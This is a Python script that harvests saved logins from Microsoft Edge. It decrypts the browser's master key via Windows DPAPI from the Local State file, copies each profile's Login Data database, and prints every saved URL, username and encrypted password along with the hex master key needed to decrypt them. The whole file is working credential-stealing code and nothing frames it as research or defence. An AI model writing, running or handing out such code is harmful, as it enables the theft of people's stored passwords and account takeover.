import os
import json
import base64
import sqlite3
import win32crypt
import shutil


temp_db = "Loginvault.db"

def get_master_key():
    local_state_path = os.path.join(os.environ['USERPROFILE'], r'AppData\Local\Microsoft\Edge\User Data\Local State')
    with open(local_state_path, "r", encoding='utf-8') as f:
        local_state = json.load(f)

    encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    encrypted_key = encrypted_key[5:] 
    master_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
    return master_key

def find_login_dbs():
    base_path = os.path.join(os.environ['USERPROFILE'], r'AppData\Local\Microsoft\Edge\User Data')
    candidates = ["", "Default", "Profile 1", "Profile 2", "Profile 3", "Profile 4", "Profile 5"]
    db_paths = []

    for folder in candidates:
        if folder:
            path = os.path.join(base_path, folder, "Login Data")
        else:
            path = os.path.join(base_path, "Login Data")

        if os.path.exists(path):
            db_paths.append((folder or "Default", path))

    return db_paths

if __name__ == '__main__':

    master_key = get_master_key()
    login_dbs = find_login_dbs()

    data=""
    for profile, db_path in login_dbs:
        shutil.copy2(db_path, temp_db)
        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()

        cursor.execute("SELECT action_url, username_value, password_value FROM logins")
        for index, login in enumerate(cursor.fetchall()):
            url = login[0]
            username = login[1]
            ciphertext = login[2]


            data+=f"{index+1}|{url}|{username}|{ciphertext.hex()}|"
        data+=f"|{master_key.hex()}"
        print(data)





        cursor.close()
        conn.close()

        try:
            os.remove(temp_db)
        except Exception:
            pass